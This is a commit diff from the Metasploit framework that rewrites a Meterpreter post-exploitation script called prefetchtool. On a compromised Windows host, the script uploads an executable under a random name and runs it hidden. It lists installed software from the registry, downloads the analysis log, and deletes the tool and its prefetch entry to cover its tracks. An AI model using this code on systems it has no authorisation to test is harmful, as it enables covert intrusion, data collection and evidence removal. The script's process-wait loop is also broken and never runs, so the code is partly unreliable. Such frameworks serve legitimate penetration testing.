f9f690b0e742cb01263685b7f745831c9fbd6d34
HD Moore <hd_moore@rapid7.com>
2009-10-25 20:50:07 +0000

    Updated prefetch script and creation of Rex::Script::Completed as a clean way to exit meterpreter scripts
    git-svn-id: file:///home/svn/framework3/trunk@7257 4d416f70-5f16-0410-b530-b9f4589650da

--- lib/rex/script.rb
+++ lib/rex/script.rb
@@ -10,29 +10,26 @@ module Rex
 ###
 module Script
 
+	class Completed < ::RuntimeError
+	end
+
 	#
 	# Reads the contents of the supplied file and exeutes them.
 	#
 	def self.execute_file(file, in_binding = nil)
 		str = ''
-
-		File.open(file) { |f|
-			begin
-				while data = f.read and data.length > 0
-					str += data
-				end
-			rescue EOFError
-			end
-		}
-
-		execute(str, in_binding)
+		buf = ::File.read(file, ::File.size(file))
+		execute(buf, in_binding)
 	end
 
 	#
 	# Executes arbitrary ruby from the supplied string.
 	#
 	def self.execute(str, in_binding = nil)
-		eval(str, in_binding)
+		begin
+			eval(str, in_binding)
+		rescue Completed
+		end
 	end
 
 end
--- scripts/meterpreter/prefetchtool.rb
+++ scripts/meterpreter/prefetchtool.rb
@@ -2,8 +2,13 @@
 #Meterpreter script for extracting information from windows prefetch folder
 #Provided by Milo at keith.lee2012[at]gmail.com
 #Verion: 0.1.0 
-session = client
-host,port = session.tunnel_peer.split(':')
+
+require 'fileutils'
+require 'net/http'
+require 'digest/sha1'
+
+@session = client
+@host,@port = @session.tunnel_peer.split(':')
 
 # Script Options
 @@exec_opts = Rex::Parser::Arguments.new(
@@ -11,149 +16,165 @@ host,port = session.tunnel_peer.split(':')
 		"-p" => [ false,  "List Installed Programs"],                 
 		"-c" => [ false,  "Disable SHA1/MD5 checksum"],                 
 		"-x" => [ true,   "Top x Accessed Executables (Based on Prefetch folder)"],                 
-		"-d" => [ false,  "Disable lookup for software name"],
+		"-i" => [ false,  "Perform lookup for software name"],
 		"-l" => [ false,  "Download Prefetch Folder Analysis Log"]
 		)
-tmp = session.fs.file.expand_path("%TEMP%")
-imgname = sprintf("%.5d",rand(100000))
-runTop = nil
-logs = ''
-logs1 = ''
 
-timeoutsec = 1000
+@tempdir = @session.fs.file.expand_path("%TEMP%")
+
 #---------------------------------------------------------------------------------------------------------
-def readprogramlist(session)
- 	begin
-	key = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', KEY_READ)
+def read_program_list
+	key = @session.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', KEY_READ)
 	sfmsvals = key.enum_key
 	sfmsvals.each do |test1|
 		begin			
 			key2 = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\"+test1
-			root_key2, base_key2 = session.sys.registry.splitkey(key2)
+			root_key2, base_key2 = @session.sys.registry.splitkey(key2)
 			value1 = "DisplayName"
 			value2 = "DisplayVersion"
-			open_key = session.sys.registry.open_key(root_key2, base_key2, KEY_READ)
+			open_key = @session.sys.registry.open_key(root_key2, base_key2, KEY_READ)
 			v1 = open_key.query_value(value1)
 			v2 = open_key.query_value(value2)
 			print_status("#{v1.data}\t(Version:  #{v2.data})")
 		rescue 
 		end
 	end
-	end
 end
 
-def prefetchdump(session,tmp,imgname,options,logs1,timeoutsec)
-	tmpout = []
-	prefetchexe = File.join(Msf::Config.install_root, "data", "prefetch.exe")
-	prefetchlog = sprintf("%.5d",rand(100000))
-	print_status("Uploading Prefetch-tool for analyzing Prefetch folder....")
-	begin
-		session.fs.file.upload_file("#{tmp}\\#{prefetchlog}.exe","#{prefetchexe}")
-		print_status("Prefetch-tool uploaded as #{tmp}\\#{prefetchlog}.exe")
-	rescue::Exception => e
-			print_status("The following Error was encountered: #{e.class} #{e}")
-	end
-	session.response_timeout=timeoutsec
+def prefetch_dump(options, logging=false)
+
+	lexe = File.join(Msf::Config.data_directory, "prefetch.exe")
+	rexe = sprintf("%.5d",rand(100000)) + ".exe"
+	rlog = sprintf("%.5d",rand(100000)) + ".txt"
 	
-	if logs1!=''
-		session = client
-		host,port = session.tunnel_peer.split(':')
-		logs = ::File.join(Msf::Config.config_directory, 'logs', 'prefetch', host + "-"+ ::Time.now.strftime("%Y%m%d.%M%S"))
-		::FileUtils.mkdir_p(logs)
-		print "[*] Saving prefetch logs to #{tmp}\\#{imgname} "
+	print_status("Uploading Prefetch-tool for analyzing Prefetch folder...")
+	begin
+		@session.fs.file.upload_file("#{@tempdir}\\#{rexe}", lexe)
+		print_status("Prefetch-tool uploaded as #{@tempdir}\\#{rexe}")
+	rescue ::Interrupt; raise $!
+	rescue ::Exception => e
+		print_status("The following error was encountered: #{e.class} #{e}")
+		return
 	end
 
-
-	print_status("Prefetch-tool executing...")
 	begin
-		r = session.sys.process.execute("cmd.exe /c #{tmp}\\#{prefetchlog}.exe #{options} #{logs1}.txt", nil, {'Hidden' => 'true','Channelized' => true})
-		while(d = r.channel.read)
-			print_status d
+	
+		if(logging)
+			options += " --txt=#{@tempdir}\\#{rlog}"
 		end
-		sleep(2)
-		prog2check = "#{prefetchlog}.exe"
-		found = 0
-		while found == 0
-			session.sys.process.get_processes().each do |x|
-				found =1
-				if prog2check == (x['name'].downcase)
-					print "."
-					sleep(0.5)
-					found = 0
-				end
+		
+		r = @session.sys.process.execute("cmd.exe /c #{@tempdir}\\#{rexe} #{options} #{rlog}", nil, {'Hidden' => 'true','Channelized' => true})
+		while(d = r.channel.read)
+			d.split("\n").each do |out|
+				print_status("OUT> #{out.strip}")
 			end
 		end
+
+		found = true
+		while (not found)
+			found = false
+			@session.sys.process.get_processes().each do |x|
+				found = false
+				if (x['name'].downcase == rexe)
+					found = true
+				end
+			end
+			sleep(0.5) if found
+		end
+		
 		r.channel.close
 		r.close
-		print "\n"
-		if logs1!=""
-			print_status("Finish extracting prefetch folder data")
-		end
-		print_status("Deleting #{prefetchlog}.exe from target...")
-		session.sys.process.execute("cmd.exe /c del #{tmp}\\#{prefetchlog}.exe", nil, {'Hidden' => 'true'})
-		session.sys.process.execute("cmd.exe /c del %windir%\\prefetch\\#{prefetchlog}*.pf", nil, {'Hidden' => 'true'})
+
+		print_status("Deleting #{rexe} from target...")
+		@session.sys.process.execute("cmd.exe /c del #{@tempdir}\\#{rexe}", nil, {'Hidden' => 'true'})
+
 		print_status("Clearing prefetch-tool prefetch entry ...")
-	rescue::Exception => e
-			print_status("The following error was encountered: #{e.class} #{e}")
-	end
-	return logs
-end
-#---------------------------------------------------------------------------------------------------------
-def logdown(session,tmp,imgname,logs,timeoutsec)
-	session.response_timeout=timeoutsec
-	print_status("Downloading prefetch-tool logs to #{logs}")
-	begin
-		session.fs.file.download_file("#{logs}#{::File::Separator}#{imgname}.txt", "#{tmp}\\#{imgname}.txt")
-		print_status("Finished downloading prefetch-tool log")
-		print_status("Deleting left over files...")
-		session.sys.process.execute("cmd.exe /c del #{tmp}\\#{imgname}", nil, {'Hidden' => 'true'})
-		print_status("Prefetch-tool log on target deleted")
-	rescue::Exception => e
-			print_status("The following Error was encountered: #{e.class} #{e}")
+		@session.sys.process.execute("cmd.exe /c del %windir%\\prefetch\\#{rexe.gsub('.exe','')}*.pf", nil, {'Hidden' => 'true'})
+
+		if(logging)
+			logfile = ::File.join(Msf::Config.config_directory, 'logs', 'prefetch', @host + "-" + ::Time.now.strftime("%Y%m%d.%M%S") + ".log")
+			print_status("[*] Saving prefetch logs to #{logfile}...")
+			@session.fs.file.download_file(logfile, "#{@tempdir}\\#{rlog}")
+			print_status("[*] Deleting log file from target...")
+			@session.sys.process.execute("cmd.exe /c del #{@tempdir}\\#{rlog}", nil, {'Hidden' => 'true'})
+		end
+
+	rescue ::Interrupt; raise $!		
+	rescue ::Exception => e
+		print_status("The following error was encountered: #{e.class} #{e}")
+		return
 	end
 end
 
+
 ################## MAIN ##################
-# Parsing of Option
-checksum = 1
-inetlookup = 1
-hlp = 0
-dwld = 0
-options1 = ""
-viewPrograms = 0
+
+options       = ""
+logging       = false
+view_list     = false
+check_update  = false
 
 @@exec_opts.parse(args) { |opt, idx, val|
 	case opt
 	when "-x"
-		options1 += " --x="+val
+		options += " --x=" + val
 	when "-c"
-		options1 += " --disable-md5 --disable-sha1"
+		options += " --disable-md5 --disable-sha1"
 	when "-p"
-		viewPrograms = 1	
-		hlp = 1
-	when "-d"
-		options1 += " --disable-lookup"
+		view_list = true
+	when "-i"
+		options += " --inet-lookup"
 	when "-l"
-		logs1 = " --txt=#{tmp}\\#{imgname}"
-		dwld = 1
+		logging = true
 	when "-h"
-		hlp = 1
-		print(
-		"Prefetch-tool Meterpreter Script\n" +
-		@@exec_opts.usage			
-		)
-		break
+		print_status( "Prefetch-tool Meterpreter Script")
+		print_line(@@exec_opts.usage)
+		raise Rex::Script::Completed
 	end
 }
-if (viewPrograms == 1)
-	readprogramlist(session)
-end
 
-if (hlp == 0)
-	print_status("Running Prefetch-tool Script.....")
-	logs2 = prefetchdump(session,tmp,imgname,options1,logs1,timeoutsec)
-	if (dwld == 1)
-		logdown(session,tmp,imgname,logs2,timeoutsec)
+prefetch_local = ::File.join(Msf::Config.data_directory, "prefetch.exe")
+
+if !(::File.exist?(prefetch_local))
+	print_status("No local copy of prefetch.exe, downloading from the internet...")
+	Net::HTTP.start("prefetch-tool.googlecode.com") do |http|
+		req  = Net::HTTP::Get.new("/files/prefetch.exe")
+		resp = http.request(req)
+		::File.open(::File.join(Msf::Config.data_directory, "prefetch.exe"), "wb") do |fd|
+			fd.write(resp.body)
+		end
+	end
+	print_status("Downloaded prefetch.exe to #{prefetch_local}")
+else
+	print_status("Checking for an updated copy of prefetch.exe..")
+	digest = Digest::SHA1.hexdigest(::File.read(prefetch_local, ::File.size(prefetch_local)))
+	
+	Net::HTTP.start("code.google.com") do |http|
+		req     = Net::HTTP::Get.new("/p/prefetch-tool/downloads/detail?name=prefetch.exe&can=2&q=")
+		resp    = http.request(req)
+		body    = resp.body
+		chksum  = body.scan(/SHA1 Checksum:.*<\/span><br>/)[0]
+		chksum.sub!(/SHA1 Checksum: /,'')
+		chksum.sub!(/<\/span><br>/,'')
+
+		if (digest != chksum)
+			print_status("Downloading an updated version of prefetch.exe to #{prefetch_local}...")
+			Net::HTTP.start("prefetch-tool.googlecode.com") do |http|
+				req  = Net::HTTP::Get.new("/files/prefetch.exe")
+				resp = http.request(req)
+				::File.open(::File.join(Msf::Config.data_directory, "prefetch.exe"), "wb") do |fd|
+					fd.write(resp.body)
+				end
+			end
+			print_status("Downloaded prefetch.exe to #{prefetch_local}")
+		end
 	end
 end
+
+if (view_list)
+	read_program_list()
+end
+
+print_status("Running Prefetch-tool script...")
+prefetch_dump(options, logging)
 
